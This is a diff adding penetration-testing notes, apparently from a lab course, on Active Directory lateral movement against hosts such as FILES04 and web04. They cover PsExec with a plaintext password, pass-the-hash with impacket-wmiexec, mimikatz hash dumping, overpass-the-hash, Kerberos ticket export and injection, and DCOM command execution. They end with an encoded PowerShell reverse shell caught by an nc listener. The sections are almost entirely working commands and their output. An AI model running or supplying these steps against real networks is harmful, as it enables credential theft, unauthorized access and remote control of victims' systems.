@@ -2892,7 +2892,356 @@ FILES04
 ~~~
 
 
+### PsExec
+---
+
+#### Obtaining an Interactive Shell on the Target System with PsExec
+
+~~~ powershell
+PS C:\Tools\SysinternalsSuite> .\PsExec64.exe -i  \\FILES04 -u corp\jen -p Nexus123! cmd
+
+PsExec v2.4 - Execute processes remotely
+Copyright (C) 2001-2022 Mark Russinovich
+Sysinternals - www.sysinternals.com
 
 
+Microsoft Windows [Version 10.0.20348.169]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>hostname
+FILES04
+
+C:\Windows\system32>whoami
+corp\jen
+~~~
+
+### Pass the Hash
+---
+
+#### Passing the hash using Impacket wmiexec
+
+~~~ bash
+kali@kali:~$ /usr/bin/impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.50.73
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[*] SMBv3.0 dialect used
+[!] Launching semi-interactive shell - Careful what you execute
+[!] Press help for extra shell commands
+C:\>hostname
+FILES04
+
+C:\>whoami
+files04\administrator
+~~~
+
+
+### Overpass the Hash
+---
+
+#### Dumping password hash for 'jen'
+
+~~~ powershell
+mimikatz # privilege::debug
+Privilege '20' OK
+mimikatz # sekurlsa::logonpasswords
+
+...
+Authentication Id : 0 ; 1142030 (00000000:00116d0e)
+Session           : Interactive from 0
+User Name         : jen
+Domain            : CORP
+Logon Server      : DC1
+Logon Time        : 2/27/2023 7:43:20 AM
+SID               : S-1-5-21-1987370270-658905905-1781884369-1124
+        msv :
+         [00000003] Primary
+         * Username : jen
+         * Domain   : CORP
+         * NTLM     : 369def79d8372408bf6e93364cc93075
+         * SHA1     : faf35992ad0df4fc418af543e5f4cb08210830d4
+         * DPAPI    : ed6686fedb60840cd49b5286a7c08fa4
+        tspkg :
+        wdigest :
+         * Username : jen
+         * Domain   : CORP
+         * Password : (null)
+        kerberos :
+         * Username : jen
+         * Domain   : CORP.COM
+         * Password : (null)
+        ssp :
+        credman :
+...
+~~~
+
+#### Creating a process with a different user's NTLM password hash
+
+~~~ powershell
+mimikatz # sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell 
+user    : jen
+domain  : corp.com
+program : powershell
+impers. : no
+NTLM    : 369def79d8372408bf6e93364cc93075
+  |  PID  8716
+  |  TID  8348
+  |  LSA Process is now R/W
+  |  LUID 0 ; 16534348 (00000000:00fc4b4c)
+  \_ msv1_0   - data copy @ 000001F3D5C69330 : OK !
+  \_ kerberos - data copy @ 000001F3D5D366C8
+   \_ des_cbc_md4       -> null
+   \_ des_cbc_md4       OK
+   \_ des_cbc_md4       OK
+   \_ des_cbc_md4       OK
+   \_ des_cbc_md4       OK
+   \_ des_cbc_md4       OK
+   \_ des_cbc_md4       OK
+   \_ *Password replace @ 000001F3D5C63B68 (32) -> null
+~~~
+
+#### Listing Kerberos tickets
+
+~~~ powershell
+PS C:\Windows\system32> klist
+
+Current LogonId is 0:0x1583ae
+
+Cached Tickets: (0)
+~~~
+
+
+
+#### Mapping a network share on a remote server
+
+~~~ powershell
+PS C:\Windows\system32> net use \\files04
+The command completed successfully.
+~~~
+
+#### Listing Kerberos tickets
+
+~~~ powershell
+PS C:\Windows\system32> klist
+
+Current LogonId is 0:0x17239e
+
+Cached Tickets: (2)
+
+#0>     Client: jen @ CORP.COM
+        Server: krbtgt/CORP.COM @ CORP.COM
+        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
+        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
+        Start Time: 2/27/2023 5:27:28 (local)
+        End Time:   2/27/2023 15:27:28 (local)
+        Renew Time: 3/6/2023 5:27:28 (local)
+        Session Key Type: RSADSI RC4-HMAC(NT)
+        Cache Flags: 0x1 -> PRIMARY
+        Kdc Called: DC1.corp.com
+
+#1>     Client: jen @ CORP.COM
+        Server: cifs/files04 @ CORP.COM
+        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
+        Ticket Flags 0x40a10000 -> forwardable renewable pre_authent name_canonicalize
+        Start Time: 2/27/2023 5:27:28 (local)
+        End Time:   2/27/2023 15:27:28 (local)
+        Renew Time: 3/6/2023 5:27:28 (local)
+        Session Key Type: AES-256-CTS-HMAC-SHA1-96
+        Cache Flags: 0
+        Kdc Called: DC1.corp.com
+~~~
+
+
+#### Opening remote connection using Kerberos
+
+~~~ powershell
+PS C:\Windows\system32> cd C:\tools\SysinternalsSuite\
+PS C:\tools\SysinternalsSuite> .\PsExec.exe \\files04 cmd
+
+PsExec v2.4 - Execute processes remotely
+Copyright (C) 2001-2022 Mark Russinovich
+Sysinternals - www.sysinternals.com
+
+
+Microsoft Windows [Version 10.0.20348.169]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+corp\jen
+
+C:\Windows\system32>hostname
+FILES04
+~~~
+
+### Pass the Ticket
+---
+
+#### Verifying that the user jen has no access to the shared folder
+
+~~~ powershell
+PS C:\Windows\system32> whoami
+corp\jen
+PS C:\Windows\system32> ls \\web04\backup
+ls : Access to the path '\\web04\backup' is denied.
+At line:1 char:1
++ ls \\web04\backup
++ ~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : PermissionDenied: (\\web04\backup:String) [Get-ChildItem], UnauthorizedAccessException
+    + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand
+~~~
+
+
+#### Exporting Kerberos TGT/TGS to disk
+
+~~~ powershell
+mimikatz #privilege::debug
+Privilege '20' OK
+
+mimikatz #sekurlsa::tickets /export
+
+Authentication Id : 0 ; 2037286 (00000000:001f1626)
+Session           : Batch from 0
+User Name         : dave
+Domain            : CORP
+Logon Server      : DC1
+Logon Time        : 9/14/2022 6:24:17 AM
+SID               : S-1-5-21-1987370270-658905905-1781884369-1103
+
+         * Username : dave
+         * Domain   : CORP.COM
+         * Password : (null)
+
+        Group 0 - Ticket Granting Service
+
+        Group 1 - Client Ticket ?
+
+        Group 2 - Ticket Granting Ticket
+         [00000000]
+           Start/End/MaxRenew: 9/14/2022 6:24:17 AM ; 9/14/2022 4:24:17 PM ; 9/21/2022 6:24:17 AM
+           Service Name (02) : krbtgt ; CORP.COM ; @ CORP.COM
+           Target Name  (02) : krbtgt ; CORP ; @ CORP.COM
+           Client Name  (01) : dave ; @ CORP.COM ( CORP )
+           Flags 40c10000    : name_canonicalize ; initial ; renewable ; forwardable ;
+           Session Key       : 0x00000012 - aes256_hmac
+             f0259e075fa30e8476836936647cdabc719fe245ba29d4b60528f04196745fe6
+           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]
+           * Saved to file [0;1f1626]-2-0-40c10000-dave@krbtgt-CORP.COM.kirbi !
+...
+~~~
+
+#### Exporting Kerberos TGT/TGS to disk
+
+~~~ powershell
+PS C:\Tools> dir *.kirbi
+
+
+    Directory: C:\Tools
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----        9/14/2022   6:24 AM           1561 [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi
+-a----        9/14/2022   6:24 AM           1505 [0;12bd0]-2-0-40c10000-dave@krbtgt-CORP.COM.kirbi
+-a----        9/14/2022   6:24 AM           1561 [0;1c6860]-0-0-40810000-dave@cifs-web04.kirbi
+-a----        9/14/2022   6:24 AM           1505 [0;1c6860]-2-0-40c10000-dave@krbtgt-CORP.COM.kirbi
+-a----        9/14/2022   6:24 AM           1561 [0;1c7bcc]-0-0-40810000-dave@cifs-web04.kirbi
+-a----        9/14/2022   6:24 AM           1505 [0;1c7bcc]-2-0-40c10000-dave@krbtgt-CORP.COM.kirbi
+-a----        9/14/2022   6:24 AM           1561 [0;1c933d]-0-0-40810000-dave@cifs-web04.kirbi
+-a----        9/14/2022   6:24 AM           1505 [0;1c933d]-2-0-40c10000-dave@krbtgt-CORP.COM.kirbi
+-a----        9/14/2022   6:24 AM           1561 [0;1ca6c2]-0-0-40810000-dave@cifs-web04.kirbi
+-a----        9/14/2022   6:24 AM           1505 [0;1ca6c2]-2-0-40c10000-dave@krbtgt-CORP.COM.kirbi
+...
+~~~
+
+#### Injecting the selected TGS into process memory
+
+~~~ powershell
+mimikatz # kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi
+
+* File: '[0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi': OK
+~~~
+
+
+
+#### Inspecting the injected ticket in memory
+
+~~~ powershell
+PS C:\Tools> klist
+
+Current LogonId is 0:0x13bca7
+
+Cached Tickets: (1)
+
+#0>     Client: dave @ CORP.COM
+        Server: cifs/web04 @ CORP.COM
+        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
+        Ticket Flags 0x40810000 -> forwardable renewable name_canonicalize
+        Start Time: 9/14/2022 5:31:32 (local)
+        End Time:   9/14/2022 15:31:13 (local)
+        Renew Time: 9/21/2022 5:31:13 (local)
+        Session Key Type: AES-256-CTS-HMAC-SHA1-96
+        Cache Flags: 0
+        Kdc Called:
+~~~
+
+
+#### Accessing the shared folder through the injected ticket
+
+~~~ powershell
+PS C:\Tools> ls \\web04\backup
+
+
+    Directory: \\web04\backup
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----        9/13/2022   2:52 AM              0 backup_schemata.txt
+~~~
+
+
+
+### DCOM
+---
+
+#### Remotely Instantiating the MMC Application object
+
+~~~ powershell
+$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","192.168.50.73"))
+~~~
+
+#### Executing a command on the remote DCOM object
+
+~~~ powershell
+$dcom.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c calc","7")
+~~~
+
+#### Verifying that calculator is running on FILES04
+
+~~~ powershell
+C:\Users\Administrator>tasklist | findstr "calc"
+win32calc.exe                 4764 Services                   0     12,132 K
+~~~
+
+#### Adding a reverse-shell as a DCOM payload on CLIENT74
+
+~~~ powershell
+$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5A...
+AC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA","7")
+~~~
+
+
+#### Obtaining a reverse-shell through DCOM lateral movement
+
+~~~ powershell
+kali@kali:~$ nc -lnvp 443
+listening on [any] 443 ...
+connect to [192.168.118.2] from (UNKNOWN) [192.168.50.73] 50778
+
+PS C:\Windows\system32> whoami
+corp\jen
+
+PS C:\Windows\system32> hostname
+FILES04
+~~~
 
 
